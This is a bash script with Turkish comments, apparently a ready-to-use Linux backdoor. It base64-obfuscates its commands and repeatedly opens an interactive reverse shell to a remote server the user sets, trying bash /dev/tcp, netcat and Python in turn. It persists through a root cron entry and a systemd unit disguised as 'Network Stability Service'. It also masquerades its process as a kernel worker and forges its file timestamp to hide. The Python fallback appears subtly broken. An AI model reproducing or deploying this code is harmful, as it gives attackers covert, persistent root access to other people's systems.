#!/bin/bash

# Clear logs
_(){ >/dev/null 2>&1; return; };_
export _=$(echo -n | base64 -d 2>/dev/null)
[ "$_" = "" ] && _="/dev/null"

# DİKKAT: Bu kısmı kendi sunucunuzla değiştirin!
# Sunucu IP/domain: example.com → ZXhhbXBsZS5jb20=
# Port: 443 → NDQz
__=$(echo "ZXhhbXBsZS5jb20=" | base64 -d)
___=$(echo "NDQz" | base64 -d)
____=300
_____="/tmp/._cache_"
______="/dev/null"

# Gizli fonksiyonlar
_________() {
    while :; do
        if command -v $(echo "YmFzaA==" | base64 -d) >$_ 2>&1; then
            $(echo "YmFzaA==" | base64 -d) -i >& /dev/tcp/$__/$___ 0>&1 2>$_ 
        elif command -v $(echo "bmM=" | base64 -d) >$_ 2>&1; then
            rm -f /tmp/._f; mkfifo /tmp/._f
            cat /tmp/._f | $(echo "L2Jpbi9zaA==" | base64 -d) -i 2>&1 | $(echo "bmM=" | base64 -d) $__ $___ >/tmp/._f
        elif command -v $(echo "cHl0aG9u" | base64 -d) >$_ 2>&1; then
            $(echo "cHl0aG9u" | base64 -d) -c "$(echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$__'",'$___'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' | base64 -d)" 2>$_
        fi
        sleep $____
    done
}

__________() {
    [ -f "$_____" ] && exit 0
    echo $$ > "$_____"
    
    # Gizli cron
    if [ -d $(echo "L2V0Yy9jcm9uLmQ=" | base64 -d) ]; then
        echo "$(echo "Ki8xMCAqICogKiAqIHJvb3Q=" | base64 -d) $(readlink -f "$0") >$______ 2>&1" > $(echo "L2V0Yy9jcm9uLmQvLl9zeXN0ZW0=" | base64 -d)
        chmod 644 $(echo "L2V0Yy9jcm9uLmQvLl9zeXN0ZW0=" | base64 -d) 2>$_
    fi
    
    # Gizli servis
    if [ -d $(echo "L2V0Yy9zeXN0ZW1kL3N5c3RlbQ==" | base64 -d) ]; then
        cat > $(echo "L2V0Yy9zeXN0ZW1kL3N5c3RlbS8uX25ldHdvcmsuc2VydmljZQ==" | base64 -d) << EOF
[Unit]
Description=Network Stability Service
After=network.target

[Service]
Type=simple
ExecStart=$(readlink -f "$0")
Restart=always
RestartSec=30
User=root
WorkingDirectory=/tmp

[Install]
WantedBy=multi-user.target
EOF
        $(echo "c3lzdGVtY3Rs" | base64 -d) daemon-reload >$_ 2>&1
        $(echo "c3lzdGVtY3Rs" | base64 -d) enable $(echo "Ll9uZXR3b3Jr" | base64 -d) >$_ 2>&1
        $(echo "c3lzdGVtY3Rs" | base64 -d) start $(echo "Ll9uZXR3b3Jr" | base64 -d) >$_ 2>&1
    fi
}

___________() {
    (exec -a $(echo "W2t3b3JrZXIvMDowXQ==" | base64 -d) "$0") &
    touch -r $(echo "L2Jpbi9scw==" | base64 -d) "$0" 2>$_
}

____________() {
    rm -f "$_____" "/tmp/._f" 2>$_
    exit 0
}

# Ana işlem
trap ____________ EXIT INT TERM

if [ "$1" != $(echo "LS1jaGlsZA==" | base64 -d) ]; then
    ___________
    __________
    nohup "$0" $(echo "LS1jaGlsZA==" | base64 -d) >$______ 2>&1 &
    exit 0
else
    _________
fi